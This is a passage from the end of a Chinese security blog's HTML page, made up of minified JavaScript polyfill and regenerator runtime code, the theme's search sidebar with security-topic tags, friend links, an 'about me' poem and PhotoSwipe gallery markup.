e=0;e<r.length;++e)if(t.next(r[e]),n)return;t.complete()}}),function(){n=!0}})}}),h(w.prototype,c,function(){return this}),e(e.G,{Observable:w}),r(74)("Observable")},function(t,n,r){var e=r(54),i=r(2),o=e.key,u=e.set;e.exp({defineMetadata:function(t,n,r,e){u(t,n,i(r),o(e))}})},function(t,n,r){var e=r(54),i=r(2),o=e.key,u=e.map,c=e.store;e.exp({deleteMetadata:function(t,n){var r=arguments.length<3?void 0:o(arguments[2]),e=u(i(n),r,!1);if(void 0===e||!e.delete(t))return!1;if(e.size)return!0;var f=c.get(n);return f.delete(r),!!f.size||c.delete(n)}})},function(t,n,r){var e=r(185),i=r(161),o=r(54),u=r(2),c=r(32),f=o.keys,a=o.key,s=function(t,n){var r=f(t,n),o=c(t);if(null===o)return r;var u=s(o,n);return u.length?r.length?i(new e(r.concat(u))):u:r};o.exp({getMetadataKeys:function(t){return s(u(t),arguments.length<2?void 0:a(arguments[1]))}})},function(t,n,r){var e=r(54),i=r(2),o=r(32),u=e.has,c=e.get,f=e.key,a=function(t,n,r){if(u(t,n,r))return c(t,n,r);var e=o(n);return null!==e?a(t,e,r):void 0};e.exp({getMetadata:function(t,n){return a(t,i(n),arguments.length<3?void 0:f(arguments[2]))}})},function(t,n,r){var e=r(54),i=r(2),o=e.keys,u=e.key;e.exp({getOwnMetadataKeys:function(t){
return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var e=r(54),i=r(2),o=e.get,u=e.key;e.exp({getOwnMetadata:function(t,n){return o(t,i(n),arguments.length<3?void 0:u(arguments[2]))}})},function(t,n,r){var e=r(54),i=r(2),o=r(32),u=e.has,c=e.key,f=function(t,n,r){if(u(t,n,r))return!0;var e=o(n);return null!==e&&f(t,e,r)};e.exp({hasMetadata:function(t,n){return f(t,i(n),arguments.length<3?void 0:c(arguments[2]))}})},function(t,n,r){var e=r(54),i=r(2),o=e.has,u=e.key;e.exp({hasOwnMetadata:function(t,n){return o(t,i(n),arguments.length<3?void 0:u(arguments[2]))}})},function(t,n,r){var e=r(54),i=r(2),o=r(26),u=e.key,c=e.set;e.exp({metadata:function(t,n){return function(r,e){c(t,n,(void 0!==e?i:o)(r),u(e))}}})},function(t,n,r){var e=r(1);e(e.P+e.R,"Set",{toJSON:r(165)("Set")})},function(t,n,r){"use strict";var e=r(1),i=r(147)(!0);e(e.P,"String",{at:function(t){return i(this,t)}})},function(t,n,r){"use strict";var e=r(1),i=r(46),o=r(16),u=r(122),c=r(120),f=RegExp.prototype,a=function(t,n){this._r=t,this._s=n};r(139)(a,"RegExp String",function(){var t=this._r.exec(this._s);return{value:t,done:null===t}}),e(e.P,"String",{matchAll:function(t){if(i(this),!u(t))throw TypeError(t+" is not a regexp!");var n=String(this),r="flags"in f?String(t.flags):c.call(t),e=new RegExp(t.source,~r.indexOf("g")?r:"g"+r);return e.lastIndex=o(t.lastIndex),new a(e,n)}})},function(t,n,r){"use strict";var e=r(1),i=r(181);e(e.P,"String",{padEnd:function(t){return i(this,t,arguments.length>1?arguments[1]:void 0,!1)}})},function(t,n,r){"use strict";var e=r(1),i=r(181);e(e.P,"String",{padStart:function(t){return i(this,t,arguments.length>1?arguments[1]:void 0,!0)}})},function(t,n,r){"use strict";r(82)("trimLeft",function(t){return function(){return t(this,1)}},"trimStart")},function(t,n,r){"use strict";r(82)("trimRight",function(t){return function(){return t(this,2)}},"trimEnd")},function(t,n,r){r(153)("asyncIterator")},function(t,n,r){r(153)("observable")},function(t,n,r){var e=r(1);e(e.S,"System",{global:r(3)})},function(t,n,r){for(var e=r(155),i=r(28),o=r(3),u=r(27),c=r(80),f=r(7),a=f("iterator"),s=f("toStringTag"),l=c.Array,h=["NodeList","DOMTokenList","MediaList","StyleSheetList","CSSRuleList"],v=0;v<5;v++){var p,d=h[v],y=o[d],g=y&&y.prototype;if(g){g[a]||u(g,a,l),g[s]||u(g,s,d),c[d]=l;for(p in e)g[p]||i(g,p,e[p],!0)}}},function(t,n,r){var e=r(1),i=r(151);e(e.G+e.B,{setImmediate:i.set,clearImmediate:i.clear})},function(t,n,r){var e=r(3),i=r(1),o=r(121),u=r(207),c=e.navigator,f=!!c&&/MSIE .\./.test(c.userAgent),a=function(t){return f?function(n,r){return t(o(u,[].slice.call(arguments,2),"function"==typeof n?n:Function(n)),r)}:t};i(i.G+i.B+i.F*f,{setTimeout:a(e.setTimeout),setInterval:a(e.setInterval)})},function(t,n,r){r(330),r(269),r(271),r(270),r(273),r(275),r(280),r(274),r(272),r(282),r(281),r(277),r(278),r(276),r(268),r(279),r(283),r(284),r(236),r(238),r(237),r(286),r(285),r(256),r(266),r(267),r(257),r(258),r(259),r(260),r(261),r(262),r(263),r(264),r(265),r(239),r(240),r(241),r(242),r(243),r(244),r(245),r(246),r(247),r(248),r(249),r(250),r(251),r(252),r(253),r(254),r(255),r(317),r(322),r(329),r(320),r(312),r(313),r(318),r(323),r(325),r(308),r(309),r(310),r(311),r(314),r(315),r(316),r(319),r(321),r(324),r(326),r(327),r(328),r(231),r(233),r(232),r(235),r(234),r(220),r(218),r(224),r(221),r(227),r(229),r(217),r(223),r(214),r(228),r(212),r(226),r(225),r(219),r(222),r(211),r(213),r(216),r(215),r(230),r(155),r(302),r(307),r(184),r(303),r(304),r(305),r(306),r(287),r(183),r(185),r(186),r(342),r(331),r(332),r(337),r(340),r(341),r(335),r(338),r(336),r(339),r(333),r(334),r(288),r(289),r(290),r(291),r(292),r(295),r(293),r(294),r(296),r(297),r(298),r(299),r(301),r(300),r(343),r(369),r(372),r(371),r(373),r(374),r(370),r(375),r(376),r(354),r(357),r(353),r(351),r(352),r(355),r(356),r(346),r(368),r(377),r(345),r(347),r(349),r(348),r(350),r(359),r(360),r(362),r(361),r(364),r(363),r(365),r(366),r(367),r(344),r(358),r(380),r(379),r(378),t.exports=r(52)},function(t,n){function r(t,n){if("string"==typeof n)return t.insertAdjacentHTML("afterend",n);var r=t.nextSibling;return r?t.parentNode.insertBefore(n,r):t.parentNode.appendChild(n)}t.exports=r},,,,,,,,,function(t,n,r){(function(n,r){!function(n){"use strict";function e(t,n,r,e){var i=n&&n.prototype instanceof o?n:o,u=Object.create(i.prototype),c=new p(e||[]);return u._invoke=s(t,r,c),u}function i(t,n,r){try{return{type:"normal",arg:t.call(n,r)}}catch(t){return{type:"throw",arg:t}}}function o(){}function u(){}function c(){}function f(t){["next","throw","return"].forEach(function(n){t[n]=function(t){return this._invoke(n,t)}})}function a(t){function n(r,e,o,u){var c=i(t[r],t,e);if("throw"!==c.type){var f=c.arg,a=f.value;return a&&"object"==typeof a&&m.call(a,"__await")?Promise.resolve(a.__await).then(function(t){n("next",t,o,u)},function(t){n("throw",t,o,u)}):Promise.resolve(a).then(function(t){f.value=t,o(f)},u)}u(c.arg)}function e(t,r){function e(){return new Promise(function(e,i){n(t,r,e,i)})}return o=o?o.then(e,e):e()}"object"==typeof r&&r.domain&&(n=r.domain.bind(n));var o;this._invoke=e}function s(t,n,r){var e=P;return function(o,u){if(e===F)throw new Error("Generator is already running");if(e===M){if("throw"===o)throw u;return y()}for(r.method=o,r.arg=u;;){var c=r.delegate;if(c){var f=l(c,r);if(f){if(f===A)continue;return f}}if("next"===r.method)r.sent=r._sent=r.arg;else if("throw"===r.method){if(e===P)throw e=M,r.arg;r.dispatchException(r.arg)}else"return"===r.method&&r.abrupt("return",r.arg);e=F;var a=i(t,n,r);if("normal"===a.type){if(e=r.done?M:j,a.arg===A)continue;return{value:a.arg,done:r.done}}"throw"===a.type&&(e=M,r.method="throw",r.arg=a.arg)}}}function l(t,n){var r=t.iterator[n.method];if(r===g){if(n.delegate=null,"throw"===n.method){if(t.iterator.return&&(n.method="return",n.arg=g,l(t,n),"throw"===n.method))return A;n.method="throw",n.arg=new TypeError("The iterator does not provide a 'throw' method")}return A}var e=i(r,t.iterator,n.arg);if("throw"===e.type)return n.method="throw",n.arg=e.arg,n.delegate=null,A;var o=e.arg;return o?o.done?(n[t.resultName]=o.value,n.next=t.nextLoc,"return"!==n.method&&(n.method="next",n.arg=g),n.delegate=null,A):o:(n.method="throw",n.arg=new TypeError("iterator result is not an object"),n.delegate=null,A)}function h(t){var n={tryLoc:t[0]};1 in t&&(n.catchLoc=t[1]),2 in t&&(n.finallyLoc=t[2],n.afterLoc=t[3]),this.tryEntries.push(n)}function v(t){var n=t.completion||{};n.type="normal",delete n.arg,t.completion=n}function p(t){this.tryEntries=[{tryLoc:"root"}],t.forEach(h,this),this.reset(!0)}function d(t){if(t){var n=t[w];if(n)return n.call(t);if("function"==typeof t.next)return t;if(!isNaN(t.length)){var r=-1,e=function n(){for(;++r<t.length;)if(m.call(t,r))return n.value=t[r],n.done=!1,n;return n.value=g,n.done=!0,n};return e.next=e}}return{next:y}}function y(){return{value:g,done:!0}}var g,b=Object.prototype,m=b.hasOwnProperty,x="function"==typeof Symbol?Symbol:{},w=x.iterator||"@@iterator",S=x.asyncIterator||"@@asyncIterator",_=x.toStringTag||"@@toStringTag",O="object"==typeof t,E=n.regeneratorRuntime;if(E)return void(O&&(t.exports=E));E=n.regeneratorRuntime=O?t.exports:{},E.wrap=e;var P="suspendedStart",j="suspendedYield",F="executing",M="completed",A={},N={};N[w]=function(){return this};var T=Object.getPrototypeOf,I=T&&T(T(d([])));I&&I!==b&&m.call(I,w)&&(N=I);var k=c.prototype=o.prototype=Object.create(N);u.prototype=k.constructor=c,c.constructor=u,c[_]=u.displayName="GeneratorFunction",E.isGeneratorFunction=function(t){var n="function"==typeof t&&t.constructor;return!!n&&(n===u||"GeneratorFunction"===(n.displayName||n.name))},E.mark=function(t){return Object.setPrototypeOf?Object.setPrototypeOf(t,c):(t.__proto__=c,_ in t||(t[_]="GeneratorFunction")),t.prototype=Object.create(k),t},E.awrap=function(t){return{__await:t}},f(a.prototype),a.prototype[S]=function(){return this},E.AsyncIterator=a,E.async=function(t,n,r,i){var o=new a(e(t,n,r,i));return E.isGeneratorFunction(n)?o:o.next().then(function(t){return t.done?t.value:o.next()})},f(k),k[_]="Generator",k.toString=function(){return"[object Generator]"},E.keys=function(t){var n=[];for(var r in t)n.push(r);return n.reverse(),function r(){for(;n.length;){var e=n.pop();if(e in t)return r.value=e,r.done=!1,r}return r.done=!0,r}},E.values=d,p.prototype={constructor:p,reset:function(t){if(this.prev=0,this.next=0,this.sent=this._sent=g,this.done=!1,this.delegate=null,this.method="next",this.arg=g,this.tryEntries.forEach(v),!t)for(var n in this)"t"===n.charAt(0)&&m.call(this,n)&&!isNaN(+n.slice(1))&&(this[n]=g)},stop:function(){this.done=!0;var t=this.tryEntries[0],n=t.completion;if("throw"===n.type)throw n.arg;return this.rval},dispatchException:function(t){function n(n,e){return o.type="throw",o.arg=t,r.next=n,e&&(r.method="next",r.arg=g),!!e}if(this.done)throw t;for(var r=this,e=this.tryEntries.length-1;e>=0;--e){var i=this.tryEntries[e],o=i.completion;if("root"===i.tryLoc)return n("end");if(i.tryLoc<=this.prev){var u=m.call(i,"catchLoc"),c=m.call(i,"finallyLoc");if(u&&c){if(this.prev<i.catchLoc)return n(i.catchLoc,!0);if(this.prev<i.finallyLoc)return n(i.finallyLoc)}else if(u){if(this.prev<i.catchLoc)return n(i.catchLoc,!0)}else{if(!c)throw new Error("try statement without catch or finally");if(this.prev<i.finallyLoc)return n(i.finallyLoc)}}}},abrupt:function(t,n){for(var r=this.tryEntries.length-1;r>=0;--r){var e=this.tryEntries[r];if(e.tryLoc<=this.prev&&m.call(e,"finallyLoc")&&this.prev<e.finallyLoc){var i=e;break}}i&&("break"===t||"continue"===t)&&i.tryLoc<=n&&n<=i.finallyLoc&&(i=null);var o=i?i.completion:{};return o.type=t,o.arg=n,i?(this.method="next",this.next=i.finallyLoc,A):this.complete(o)},complete:function(t,n){if("throw"===t.type)throw t.arg;return"break"===t.type||"continue"===t.type?this.next=t.arg:"return"===t.type?(this.rval=this.arg=t.arg,this.method="return",this.next="end"):"normal"===t.type&&n&&(this.next=n),A},finish:function(t){for(var n=this.tryEntries.length-1;n>=0;--n){var r=this.tryEntries[n];if(r.finallyLoc===t)return this.complete(r.completion,r.afterLoc),v(r),A}},catch:function(t){for(var n=this.tryEntries.length-1;n>=0;--n){var r=this.tryEntries[n];if(r.tryLoc===t){var e=r.completion;if("throw"===e.type){var i=e.arg;v(r)}return i}}throw new Error("illegal catch attempt")},delegateYield:function(t,n,r){return this.delegate={iterator:d(t),resultName:n,nextLoc:r},"next"===this.method&&(this.arg=g),A}}}("object"==typeof n?n:"object"==typeof window?window:"object"==typeof self?self:this)}).call(n,function(){return this}(),r(158))}])</script><script src="/./main.0cf68a.js"></script><script>!function(){!function(e){var t=document.createElement("script");document.getElementsByTagName("body")[0].appendChild(t),t.setAttribute("src",e)}("/slider.e37972.js")}()</script>


    
<div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
  <div class="tools-nav header-menu">
    
    
      
      
      
    
      
      
      
    
      
      
      
    
    

    <ul style="width: 70%">
    
    
      
      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">文章搜搜</a></li>
      
        
      
      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">友情链接</a></li>
      
        
      
      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">About me</a></li>
      
        
    </ul>
  </div>
  <div class="tools-wrap">
    
    	<section class="tools-section tools-section-all" q-show="innerArchive">
        <div class="search-wrap">
          <input class="search-ipt" q-model="search" type="text" placeholder="find something…">
          <i class="icon-search icon" q-show="search|isEmptyStr"></i>
          <i class="icon-close icon" q-show="search|isNotEmptyStr" q-on="click:clearChose(e)"></i>
        </div>
        <div class="widget tagcloud search-tag">
          <p class="search-tag-wording">tag:</p>
          <label class="search-switch">
            <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
          </label>
          <ul class="article-tag-list" q-show="showTags">
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">安全</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">信息收集</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">随记</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color2">dnslog</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">社会工程</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">暗网</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">经验</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">json</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">elk</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">爆破</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">msf</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">fastjson</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">反序列化</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">fortify</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">fortify速查</a>
              </li>
            
            <div class="clearfix"></div>
          </ul>
        </div>
        <ul class="search-ul">
          <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
            缺失模块。<br/>1、请确保node版本大于6.2<br/>2、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
            3、在根目录_config.yml里添加配置：
<pre style="font-size: 12px;" q-show="jsonFail">
  jsonContent:
    meta: false
    pages: false
    posts:
      title: true
      date: true
      path: true
      text: false
      raw: false
      content: false
      slug: false
      updated: false
      comments: false
      link: false
      permalink: false
      excerpt: false
      categories: false
      tags: true
</pre>
          </p>
          <li class="search-li" q-repeat="items" q-show="isShow">
            <a q-attr="href:path|urlformat" class="search-title"><i class="icon-quo-left icon"></i><span q-text="title"></span></a>
            <p class="search-time">
              <i class="icon-calendar icon"></i>
              <span q-text="date|dateformat"></span>
            </p>
            <p class="search-tag">
              <i class="icon-price-tags icon"></i>
              <span q-repeat="tags" q-on="click:choseTag(e, name)" q-text="name|tagformat"></span>
            </p>
          </li>
        </ul>
    	</section>
    

    
    	<section class="tools-section tools-section-friends" q-show="friends">
  		
        <ul class="search-ul">
          
            <li class="search-li">
              <a href="http://blog.sina.com.cn/s/articlelist_1874551935_0_1.html" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>本人新浪博客</a>
            </li>
          
            <li class="search-li">
              <a href="https://yangrz.github.io/blog/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>y1r0nz技术博客</a>
            </li>
          
        </ul>
  		
    	</section>
    

    
    	<section class="tools-section tools-section-me" q-show="aboutme">
  	  	
  	  		<div class="aboutme-wrap" id="js-aboutme">一小小幽灵&lt;br&gt;潜伏在黑暗中&lt;br&gt;而自误自乐，&lt;br&gt;偶尔享受音乐，&lt;br&gt;偶尔研究技术，&lt;br&gt;偶尔静静发呆。</div>
  	  	
    	</section>
    
  </div>
  
</div>
    <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>
  </div>
</body>
</html>